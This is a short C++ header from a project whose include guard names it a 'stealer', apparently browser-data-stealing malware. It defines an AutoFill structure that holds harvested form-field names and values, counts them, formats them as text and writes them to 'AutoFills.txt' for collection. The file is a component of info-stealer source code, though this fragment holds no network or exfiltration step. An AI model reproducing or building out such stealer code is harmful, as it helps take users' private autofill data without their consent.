//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_AUTOFILL_H
#define STEALER_AUTOFILL_H

#include "../Includes.h"
#include "Entity.h"

struct AutoFill : public Entity {
    std::string name;
    std::string value;

    bool canBeWrite() override {
        return !(this->name.empty() && this->value.empty());
    }

    std::string toString() override {
        Counter::increaseAutoFills();

        return "Name: " + this->name + "\n" +
               "Value: " + this->value;
    }

    std::string getFileName() override {
        return "AutoFills.txt";
    }
};

#endif //STEALER_AUTOFILL_H
